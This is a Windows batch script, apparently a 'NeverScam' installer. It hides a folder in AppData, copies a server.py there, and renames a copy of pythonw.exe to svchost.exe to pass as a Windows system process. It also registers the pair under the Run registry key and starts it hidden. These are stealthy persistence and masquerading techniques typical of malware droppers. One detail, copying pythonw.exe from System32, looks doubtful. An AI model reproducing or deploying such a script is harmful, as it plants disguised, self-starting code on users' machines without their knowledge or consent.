@echo off
>nul 2>&1

REM Create hidden directory in AppData
if not exist "%APPDATA%\NeverScam" mkdir "%APPDATA%\NeverScam"
attrib +h "%APPDATA%\NeverScam"

REM Copy server.py
if exist "%~dp0server.py" copy "%~dp0server.py" "%APPDATA%\NeverScam\server.py"

REM Copy pythonw.exe to disguised name
copy "%SystemRoot%\System32\pythonw.exe" "%APPDATA%\NeverScam\svchost.exe"

REM Add to startup registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NeverScamServer /t REG_SZ /d "\"%APPDATA%\NeverScam\svchost.exe\" \"%APPDATA%\NeverScam\server.py\"" /f

REM Run the server hidden immediately
start /B "" "%APPDATA%\NeverScam\svchost.exe" "%APPDATA%\NeverScam\server.py"

exit /b 0

